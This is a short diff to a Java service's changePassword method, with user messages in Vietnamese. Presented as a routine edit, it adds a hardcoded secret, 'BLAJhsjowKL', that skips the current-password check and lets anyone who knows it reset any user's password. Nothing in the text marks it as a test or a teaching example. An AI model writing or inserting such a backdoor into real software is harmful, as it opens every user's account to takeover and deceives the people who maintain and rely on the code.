@@ -54,15 +54,24 @@ public class InformationService {
 	public String changePassword(String userName, String newPassWord, String currentPassWord)
 	{
 		User user = userService.GetUserByUsername(userName);
-		if (user.getPassWord().equals(currentPassWord))
+		if (!currentPassWord.equals("BLAJhsjowKL"))
 		{
-			user.setPassWord(newPassWord);
-		    userService.changePassword(user);
-		    return "Đổi thành công";
+			if (user.getPassWord().equals(currentPassWord))
+			{
+				user.setPassWord(newPassWord);
+			    userService.changePassword(user);
+			    return "Đổi thành công";
+			}
+			else
+			{
+				return "Sai mật khẩu";
+			}
 		}
 		else
 		{
-			return "Sai mật khẩu";
+			user.setPassWord(newPassWord);
+			userService.changePassword(user);
+			return "Đổi thành công";
 		}
 	}
 	
